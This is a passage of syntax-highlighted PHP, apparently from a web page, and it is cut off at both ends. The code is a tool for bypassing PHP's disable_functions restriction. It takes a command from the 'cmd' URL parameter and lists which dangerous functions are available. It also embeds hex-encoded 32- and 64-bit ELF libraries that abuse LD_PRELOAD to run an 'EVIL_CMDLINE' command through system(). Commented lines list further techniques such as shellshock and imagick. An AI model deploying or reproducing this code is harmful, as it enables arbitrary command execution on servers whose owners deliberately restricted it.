class="string">"\n"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$command = isset(<span class="name">$_GET</span>['cmd']) ? $_GET['cmd'] : <span class="string">'id'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">echo <span class="string">"Run command: $command\n====================\n"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">if(<span class="name">is_x64</span>()){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    define(<span class="name">ARCH</span>, <span class="number">64</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    define(<span class="name">ARCH</span>, <span class="number">32</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$OS = strtoupper(<span class="name">substr</span>(<span class="name">PHP_OS</span>,<span class="number">0</span>,<span class="number">3</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">if(<span class="name">$OS</span> === <span class="string">'WIN'</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    define(<span class="name">OS</span>, <span class="string">'Windows'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}elseif (<span class="name">$OS</span> === <span class="string">'DAR'</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    define(<span class="name">OS</span>, <span class="string">'Darwin'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}else{</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    define(<span class="name">OS</span>, <span class="string">'Linux'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">unset(<span class="name">$OS</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">define(<span class="name">WRITE_DIR</span>, sys_get_temp_dir() . DIRECTORY_SEPARATOR);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">define(<span class="name">FAILURE</span>, <span class="string">'3ee28fe1a60c95b89d29317f122c7021'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$disable_function_str = get_cfg_var(<span class="name">"disable_functions"</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$disable_function_arr = explode(<span class="name">","</span>,$disable_function_str);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$vul_function_str = <span class="string">'dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,error_log,mb_send_mail,putenv,ini_set,apache_setenv,symlink,link'</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$vul_function_arr = explode(<span class="name">","</span>, $vul_function_str);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$open_basedir = get_cfg_var(<span class="name">"open_basedir"</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$myscript = $_SERVER['PHP_SELF'];</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$GLOBALS["system_so_x64"] = <span class="string">"7f454c4602010100000000000000000003003e0001000000c006000000000000400000000000000028140000000000000000000040003800060040001c001900010000000500000000000000000000000000000000000000000000000000000004090000000000000409000000000000000020000000000001000000060000000809000000000000080920000000000008092000000000005802000000000000600200000000000000002000000000000200000006000000280900000000000028092000000000002809200000000000c001000000000000c0010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050e57464040000008408000000000000840800000000000084080000000000001c000000000000001c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000040000001400000003000000474e550066bb9e247f3731670b5cdfd534ac53233e576aef00000000030000000d000000010000000600000088c22001001440090d0000000f000000110000004245d5ecbbe3927cd871581cb98df10eead3ef0e6d1287c2000000000000000000000000000000000000000000000000000000000000000003000900380600000000000000000000000000007d00000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000008b00000012000000000000000000000000000000000000009d00000021000000000000000000000000000000000000000100000020000000000000000000000000000000000000009e00000011000000000000000000000000000000000000006100000020000000000000000000000000000000000000009c0000001100000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000840000001200000000000000000000000000000000000000a600000010001600600b2000000000000000000000000000b900000010001700680b2000000000000000000000000000ad00000010001700600b20000000000000000000000000001000000012000900380600000000000000000000000000001600000012000c00600800000000000000000000000000007500000012000b00c0070000000000009d00000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573007072656c6f616400676574656e76007374727374720073797374656d006c6962632e736f2e36005f5f656e7669726f6e005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200000002000200000002000000020000000200020001000100010001000100010001000100920000001000000000000000751a690900000200be00000000000000080920000000000008000000000000009007000000000000180920000000000008000000000000005007000000000000580b2000000000000800000000000000580b200000000000100920000000000001000000120000000000000000000000e80a20000000000006000000030000000000000000000000f00a20000000000006000000060000000000000000000000f80a20000000000006000000070000000000000000000000000b20000000000006000000080000000000000000000000080b200000000000060000000a0000000000000000000000100b200000000000060000000b0000000000000000000000300b20000000000007000000020000000000000000000000380b20000000000007000000040000000000000000000000400b20000000000007000000060000000000000000000000480b200000000000070000000b0000000000000000000000500b200000000000070000000c00000000000000000000004883ec08488b05ad0420004885c07405e8430000004883c408c30000000000000000000000000000ff35ba042000ff25bc0420000f1f4000ff25ba0420006800000000e9e0ffffffff25b20420006801000000e9d0ffffffff25aa0420006802000000e9c0ffffffff25a20420006803000000e9b0ffffffff259a0420006804000000e9a0ffffff488d3d99042000488d0599042000554829f84889e54883f80e7615488b05060420004885c074095dffe0660f1f4400005dc366666666662e0f1f840000000000488d3d59042000488d3552042000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05d90320004885c0740c5dffe0660f1f8400000000005dc366666666662e0f1f840000000000803d0904200000752748833daf03200000554889e5740c488b3dea032000e82dffffffe848ffffff5dc605e003200001f3c366666666662e0f1f840000000000488d3d8901200048833f00750be95effffff660f1f440000488b05510320004885c074e9554889e5ffd05de940ffffff554889e54883ec10488d3d9a000000e89cfeffff488945f0c745fc00000000eb4f488b0510032000488b008b55fc4863d248c1e2034801d0488b00488d35740000004889c7e8a6feffff4885c0741d488b05e2022000488b008b55fc4863d248c1e2034801d0488b00c600008345fc01488b05c1022000488b008b55fc4863d248c1e2034801d0488b004885c07592488b45f04889c7e825feffffc9c30000004883ec084883c408c34556494c5f434d444c494e45004c445f5052454c4f414400000000011b033b1800000002000000dcfdffff340000003cffffff5c0000001400000000000000017a5200017810011b0c070890010000240000001c000000a0fdffff60000000000e10460e184a0f0b770880003f1a3b2a332422000000001c00000044000000d8feffff9d00000000410e108602430d0602980c0708000000000000000000009007000000000000000000000000000050070000000000000000000000000000010000000000000092000000000000000c0000000000000038060000000000000d000000000000006008000000000000190000000000000008092000000000001b0000000000000010000000000000001a0000000000000018092000000000001c000000000000000800000000000000f5feff6f00000000b8010000000000000500000000000000c0030000000000000600000000000000f8010000000000000a00000000000000ca000000000000000b0000000000000018000000000000000300000000000000180b20000000000002000000000000007800000000000000140000000000000007000000000000001700000000000000c0050000000000000700000000000000d0040000000000000800000000000000f00000000000000009000000000000001800000000000000feffff6f00000000b004000000000000ffffff6f000000000100000000000000f0ffff6f000000008a04000000000000f9ffff6f0000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000280920000000000000000000000000000000000000000000760600000000000086060000000000009606000000000000a606000000000000b606000000000000580b2000000000004743433a202844656269616e20342e392e322d31302b6465623875322920342e392e3200002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e740000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200b80100000000000000000000000000000000000003000300f80100000000000000000000000000000000000003000400c003000000000000000000000000000000000000030005008a0400000000000000000000000000000000000003000600b00400000000000000000000000000000000000003000700d00400000000000000000000000000000000000003000800c00500000000000000000000000000000000000003000900380600000000000000000000000000000000000003000a00600600000000000000000000000000000000000003000b00c00600000000000000000000000000000000000003000c00600800000000000000000000000000000000000003000d00690800000000000000000000000000000000000003000e00840800000000000000000000000000000000000003000f00a00800000000000000000000000000000000000003001000080920000000000000000000000000000000000003001100180920000000000000000000000000000000000003001200200920000000000000000000000000000000000003001300280920000000000000000000000000000000000003001400e80a20000000000000000000000000000000000003001500180b20000000000000000000000000000000000003001600580b20000000000000000000000000000000000003001700600b2000000000000000000000000000000000000300180000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001200200920000000000000000000000000001900000002000b00c00600000000000000000000000000002e00000002000b00000700000000000000000000000000004100000002000b00500700000000000000000000000000005700000001001700600b20000000000001000000000000006600000001001100180920000000000000000000000000008d00000002000b0090070000000000000000000000000000990000000100100008092000000000000000000000000000b80000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000cd00000001000f0000090000000000000000000000000000db0000000100120020092000000000000000000000000000000000000400f1ff00000000000000000000000000000000e700000001001600580b2000000000000000000000000000f40000000100130028092000000000000000000000000000fd00000001001600600b20000000000000000000000000000901000001001500180b20000000000000000000000000001f01000012000000000000000000000000000000000000003301000020000000000000000000000000000000000000004f01000010001600600b20000000000000000000000000005601000012000c00600800000000000000000000000000005c01000012000000000000000000000000000000000000007001000020000000000000000000000000000000000000007f01000011000000000000000000000000000000000000009401000010001700680b20000000000000000000000000009901000010001700600b2000000000000000000000000000a501000012000b00c0070000000000009d00000000000000ad0100002000000000000000000000000000000000000000c10100001100000000000000000000000000000000000000d80100002000000000000000000000000000000000000000f201000022000000000000000000000000000000000000000e02000012000900380600000000000000000000000000001402000012000000000000000000000000000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e65730072656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e36363730005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006279706173735f64697361626c6566756e632e63005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00676574656e764040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65005f6564617461005f66696e690073797374656d4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f00656e7669726f6e4040474c4942435f322e322e35005f656e64005f5f6273735f7374617274007072656c6f6164005f4a765f5265676973746572436c6173736573005f5f656e7669726f6e4040474c4942435f322e322e35005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35005f696e6974007374727374724040474c4942435f322e322e3500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000b801000000000000b8010000000000003c00000000000000030000000000000008000000000000000000000000000000380000000b0000000200000000000000f801000000000000f801000000000000c80100000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000c003000000000000c003000000000000ca0000000000000000000000000000000100000000000000000000000000000048000000ffffff6f02000000000000008a040000000000008a04000000000000260000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000b004000000000000b004000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000d004000000000000d004000000000000f0000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000c005000000000000c0050000000000007800000000000000030000000a0000000800000000000000180000000000000078000000010000000600000000000000380600000000000038060000000000001a00000000000000000000000000000004000000000000000000000000000000730000000100000006000000000000006006000000000000600600000000000060000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000c006000000000000c0060000000000009d01000000000000000000000000000010000000000000000000000000000000840000000100000006000000000000006008000000000000600800000000000009000000000000000000000000000000040000000000000000000000000000008a00000001000000020000000000000069080000000000006908000000000000180000000000000000000000000000000100000000000000000000000000000092000000010000000200000000000000840800000000000084080000000000001c00000000000000000000000000000004000000000000000000000000000000a0000000010000000200000000000000a008000000000000a0080000000000006400000000000000000000000000000008000000000000000000000000000000aa0000000e0000000300000000000000080920000000000008090000000000001000000000000000000000000000000008000000000000000000000000000000b60000000f0000000300000000000000180920000000000018090000000000000800000000000000000000000000000008000000000000000000000000000000c2000000010000000300000000000000200920000000000020090000000000000800000000000000000000000000000008000000000000000000000000000000c700000006000000030000000000000028092000000000002809000000000000c001000000000000040000000000000008000000000000001000000000000000d0000000010000000300000000000000e80a200000000000e80a0000000000003000000000000000000000000000000008000000000000000800000000000000d5000000010000000300000000000000180b200000000000180b0000000000004000000000000000000000000000000008000000000000000800000000000000de000000010000000300000000000000580b200000000000580b0000000000000800000000000000000000000000000008000000000000000000000000000000e4000000080000000300000000000000600b200000000000600b0000000000000800000000000000000000000000000001000000000000000000000000000000e90000000100000030000000000000000000000000000000600b0000000000002400000000000000000000000000000001000000000000000100000000000000110000000300000000000000000000000000000000000000840b000000000000f200000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000780c00000000000088050000000000001b0000002b0000000800000000000000180000000000000009000000030000000000000000000000000000000000000000120000000000002802000000000000000000000000000001000000000000000000000000000000"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$GLOBALS["system_so_x32"] = <span class="string">"7f454c4601010100000000000000000003000300010000001004000034000000080800000000000034002000050028001b00180001000000000000000000000000000000f0050000f0050000050000000010000001000000f0050000f0150000f01500000c010000140100000600000000100000020000000c0600000c1600000c160000c0000000c0000000060000000400000004000000d4000000d4000000d40000002400000024000000040000000400000051e5746400000000000000000000000000000000000000000600000004000000040000001400000003000000474e550046274bfc049fbd2fbee3fc9508888b1312b57aab030000000a00000002000000060000008800200100d640090a0000000c0000000e000000bae3927c4345d5ecd871581cb98df10e6c1287c2ebd3ef0e00000000000000000000000000000000010000000000000000000000200000002b0000000000000000000000200000004700000000000000000000001200000055000000000000000000000012000000680000000000000000000000110000004e00000000000000000000001200000067000000000000000000000021000000660000000000000000000000110000001c0000000000000000000000220000008300000004170000000000001000f1ff70000000fc160000000000001000f1ff77000000fc160000000000001000f1ff100000007c03000000000000120009003f000000e00400009400000012000b0016000000b80500000000000012000c00005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573007072656c6f616400676574656e76007374727374720073797374656d006c6962632e736f2e36005f5f656e7669726f6e005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e300000000000000002000200020002000200020003000100010001000100010001000000010002005c0000001000000000000000731f69090000030088000000100000001069690d0000020094000000000000000816000008000000f4150000010e0000cc16000006010000d016000006020000d416000006050000d816000006090000e816000007010000ec16000007030000f016000007040000f416000007060000f8160000070900005589e55383ec04e8000000005b81c3541300008b93f0ffffff85d27405e81e000000e8fd000000e8d8010000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffffffa3140000006810000000e9c0ffffffffa3180000006818000000e9b0ffffffffa31c0000006820000000e9a0ffffff000000005589e55653e8bf00000081c3c21200008d6424f080bb2000000000755c8b83fcffffff85c0740e8d832cffffff890424e8b7ffffff8db324ffffff8d9320ffffff29d68b8324000000c1fe0283ee0139f0731f908d74260083c001898324000000ff948320ffffff8b832400000039f072e6c68320000000018d6424105b5e5dc3eb0d909090909090909090909090905589e553e83000000081c3331200008d6424ec8b9328ffffff85d274158b83f4ffffff85c0740b8d9328ffffff891424ffd08d6424145b5dc38b1c24c39090905589e55383ec24e8edffffff81c3f01100008d83f8eeffff890424e8ccfeffff8945f0c745f400000000eb418b83f8ffffff8b008b55f4c1e20201d08b008d9305efffff89542404890424e8bcfeffff85c074158b83f8ffffff8b008b55f4c1e20201d08b00c600008345f4018b83f8ffffff8b008b55f4c1e20201d08b0085c075a98b45f0890424e86efeffff83c4245b5dc39090909090909090909090905589e55653e84fffffff81c3521100008b8318ffffff83f8ff74198db318ffffff8db426000000008d76fcffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c318110000e840feffff595bc9c34556494c5f434d444c494e45004c445f5052454c4f41440000000000ffffffff0000000000000000ffffffff000000000000000008160000010000005c0000000c0000007c0300000d000000b8050000f5feff6ff8000000050000003402000006000000340100000a0000009e0000000b0000001000000003000000dc160000020000002800000014000000110000001700000054030000110000002403000012000000300000001300000008000000feffff6ff4020000ffffff6f01000000f0ffff6fd2020000faffff6f0100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c1600000000000000000000c2030000d2030000e2030000f2030000020400004743433a2028474e552920342e342e3720323031323033313320285265642048617420342e342e372d32332900002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000001b0000000700000002000000d4000000d400000024000000000000000000000004000000000000002e000000f6ffff6f02000000f8000000f80000003c00000003000000000000000400000004000000380000000b000000020000003401000034010000000100000400000001000000040000001000000040000000030000000200000034020000340200009e0000000000000000000000010000000000000048000000ffffff6f02000000d2020000d2020000200000000300000000000000020000000200000055000000feffff6f02000000f4020000f40200003000000004000000010000000400000000000000640000000900000002000000240300002403000030000000030000000000000004000000080000006d0000000900000002000000540300005403000028000000030000000a00000004000000080000007600000001000000060000007c0300007c0300003000000000000000000000000400000000000000710000000100000006000000ac030000ac03000060000000000000000000000004000000040000007c00000001000000060000001004000010040000a801000000000000000000001000000000000000820000000100000006000000b8050000b80500001c00000000000000000000000400000000000000880000000100000002000000d4050000d40500001800000000000000000000000100000000000000900000000100000002000000ec050000ec05000004000000000000000000000004000000000000009a0000000100000003000000f0150000f00500000c00000000000000000000000400000000000000a10000000100000003000000fc150000fc0500000800000000000000000000000400000000000000a8000000010000000300000004160000040600000400000000000000000000000400000000000000ad000000010000000300000008160000080600000400000000000000000000000400000000000000ba00000006000000030000000c1600000c060000c000000004000000000000000400000008000000c30000000100000003000000cc160000cc0600001000000000000000000000000400000004000000c80000000100000003000000dc160000dc0600002000000000000000000000000400000004000000d10000000800000003000000fc160000fc0600000800000000000000000000000400000000000000d6000000010000003000000000000000fc0600002d000000000000000000000001000000010000001100000003000000000000000000000029070000df0000000000000000000000010000000000000001000000020000000000000000000000400c0000900300001a0000002b000000040000001000000009000000030000000000000000000000d00f0000df010000000000000000000001000000000000000000000000000000000000000000000000000000d4000000000000000300010000000000f80000000000000003000200000000003401000000000000030003000000000034020000000000000300040000000000d2020000000000000300050000000000f402000000000000030006000000000024030000000000000300070000000000540300000000000003000800000000007c030000000000000300090000000000ac0300000000000003000a0000000000100400000000000003000b0000000000b80500000000000003000c0000000000d40500000000000003000d0000000000ec0500000000000003000e0000000000f01500000000000003000f0000000000fc15000000000000030010000000000004160000000000000300110000000000081600000000000003001200000000000c160000000000000300130000000000cc160000000000000300140000000000dc160000000000000300150000000000fc1600000000000003001600000000000000000000000000030017000100000000000000000000000400f1ff0c000000f01500000000000001000f001a000000fc15000000000000010010002800000004160000000000000100110035000000100400000000000002000b004b000000fc16000001000000010016005a00000000170000040000000100160068000000a00400000000000002000b000100000000000000000000000400f1ff74000000f81500000000000001000f0081000000ec0500000000000001000e008f0000000416000000000000010011009b000000800500000000000002000b00b100000000000000000000000400f1ffc6000000dc160000000000000100f1ffdc000000081600000000000001001200e9000000001600000000000001001000f6000000d90400000000000002000b000d0100000c160000000000000100f1ff16010000e00400009400000012000b001e0100000000000000000000200000002d0100000000000000000000200000004101000000000000000000001200000053010000b80500000000000012000c00590100000000000000000000120000006b0100000000000000000000110000007e01000000000000000000001200000090010000fc160000000000001000f1ff9c01000004170000000000001000f1ffa1010000000000000000000011000000b6010000fc160000000000001000f1ffbd010000000000000000000022000000d90100007c03000000000000120009000063727473747566662e63005f5f43544f525f4c4953545f5f005f5f44544f525f4c4953545f5f005f5f4a43525f4c4953545f5f005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e353938360064746f725f6964782e35393838006672616d655f64756d6d79005f5f43544f525f454e445f5f005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f646f5f676c6f62616c5f63746f72735f617578006279706173735f64697361626c6566756e632e63005f474c4f42414c5f4f46465345545f5441424c455f005f5f64736f5f68616e646c65005f5f44544f525f454e445f5f005f5f693638362e6765745f70635f7468756e6b2e6278005f44594e414d4943007072656c6f6164005f5f676d6f6e5f73746172745f5f005f4a765f5265676973746572436c617373657300676574656e764040474c4942435f322e30005f66696e690073797374656d4040474c4942435f322e3000656e7669726f6e4040474c4942435f322e30007374727374724040474c4942435f322e30005f5f6273735f7374617274005f656e64005f5f656e7669726f6e4040474c4942435f322e30005f6564617461005f5f6378615f66696e616c697a654040474c4942435f322e312e33005f696e697400"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$GLOBALS["php_so_x64"] = <span class="string">""</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">$GLOBALS["php_so_x32"] = <span class="string">""</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//$plugin_func_arr = array(</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="name">"common_exec_cmd"</span> =&gt; array(<span class="name">"exec"</span>, <span class="string">"shell_exec"</span>, <span class="string">"system"</span>, <span class="string">"passthru"</span>, <span class="string">"popen"</span>, <span class="string">"proc_open"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"load_so"</span> =&gt; array(<span class="name">"dl"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"ld_preload_so"</span> =&gt; array(<span class="name">"mail"</span>, <span class="string">"error_log"</span>, <span class="string">"imap_mail"</span>, <span class="string">"mb_send_mail"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"shellshock"</span> =&gt; array(<span class="name">"mail"</span>),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"apache_mod_cgi"</span> =&gt; array(),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"imagick"</span> =&gt; array(),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    <span class="string">"pwn"</span> =&gt; array(),</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">echo <span class="string">"Temp Dir:"</span> . WRITE_DIR . <span class="string">"&lt;br&gt;"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">echo <span class="string">"Arch: "</span> . ARCH . <span class="string">"; OS: "</span> . OS . <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">foreach (<span class="name">$vul_function_arr</span> as $func) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        if (<span class="name">function_exists</span>(<span class="name">$func</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            echo <span class="string">"&lt;font style='color: red'&gt;Exist: "</span>.$func."&lt;/font&gt;&lt;br&gt;";</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            echo <span class="string">"no exist: "</span>.$func."&lt;br&gt;";</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function read_file(<span class="name">$filename</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if(<span class="name">function_exists</span>(<span class="name">'file_get_contents'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return file_get_contents(<span class="name">$filename</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } elseif (<span class="name">function_exists</span>(<span class="name">'fopen'</span>) &amp;&amp; function_exists(<span class="name">'fread'</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $handle = fopen(<span class="name">$filename</span>, <span class="string">'r'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $content = <span class="string">''</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        while(!<span class="name">feof</span>(<span class="name">$handle</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">            $content .= fread(<span class="name">$handle</span>, <span class="number">1000</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        fclose(<span class="name">$handle</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return $content;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        echo <span class="string">"no read function"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function write_file(<span class="name">$filename</span>, $content, <span class="attr">$model</span>=<span class="string">"w"</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">function_exists</span>(<span class="name">'file_put_contents'</span>)) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        file_put_contents(<span class="name">$filename</span>, $content);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        echo <span class="string">"no write function"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function random_str(<span class="name">$len</span> = <span class="number">8</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $s = <span class="string">''</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    for (<span class="name">$i</span> = <span class="number">0</span>; $i &lt; $len; $i++) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $s .= chr(<span class="name">mt_rand</span>(<span class="name">33</span>, <span class="number">126</span>));</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return $s;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function is_x64() {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $int = <span class="string">"9223372036854775807"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $int = intval(<span class="name">$int</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if (<span class="name">$int</span> == <span class="number">9223372036854775807</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        return <span class="literal">true</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span 